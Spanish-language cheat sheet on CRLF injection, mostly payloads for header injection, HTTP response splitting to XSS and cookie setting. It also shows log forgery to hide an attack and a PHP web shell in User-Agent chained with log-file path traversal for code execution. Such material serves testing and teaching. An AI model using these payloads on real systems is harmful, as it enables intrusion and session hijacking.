---
icon: database
---

# CRLF Injection

`\r\n` (Carriage Return + Line Feed) es el separador de líneas en HTTP. Si el input del usuario se incluye en cabeceras HTTP sin sanitizar, se pueden inyectar cabeceras adicionales o dividir la respuesta.

#### Detección

```bash
# Probar en parámetros que se reflejan en cabeceras
# (Location, Set-Cookie, etc.)

# Payload básico
%0d%0a          → \r\n
%0a             → \n
%0d             → \r
%E5%98%8A%E5%98%8D  → Unicode CRLF

# En parámetro de redirección
?redirect=https://target.com%0d%0aSet-Cookie:%20session=evil
```

#### HTTP Response Splitting

```http
-- Petición con CRLF en el parámetro redirect --
GET /redirect?url=https://target.com%0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Type:%20text/html%0d%0a%0d%0a<script>alert(1)</script> HTTP/1.1

-- Respuesta resultante --
HTTP/1.1 302 Found
Location: https://target.com
Content-Length: 0

HTTP/1.1 200 OK
Content-Type: text/html

<script>alert(1)</script>
```

#### Inyección de cookies

```http
GET /login?lang=es%0d%0aSet-Cookie:%20admin=true HTTP/1.1

→ Respuesta:
HTTP/1.1 200 OK
Content-Language: es
Set-Cookie: admin=true
```

#### Log Injection

```bash
# Si el input se loguea sin sanitizar
# Inyectar entradas falsas en los logs para ofuscar el ataque
username=admin%0a127.0.0.1 - - [01/Jan/2024] "GET /legitimate HTTP/1.1" 200 0

# Inyectar código en logs PHP que luego se incluyen (→ LFI + RCE)
# Inyectar en User-Agent:
User-Agent: <?php system($_GET['cmd']); ?>
# Luego incluir el log: ?page=../../../var/log/apache2/access.log
```

> CRLF injection puede escalar a XSS si se puede inyectar una cabecera `Content-Type: text/html` y un body HTML, convirtiendo un CRLF aparentemente menor en una vulnerabilidad de impacto alto.
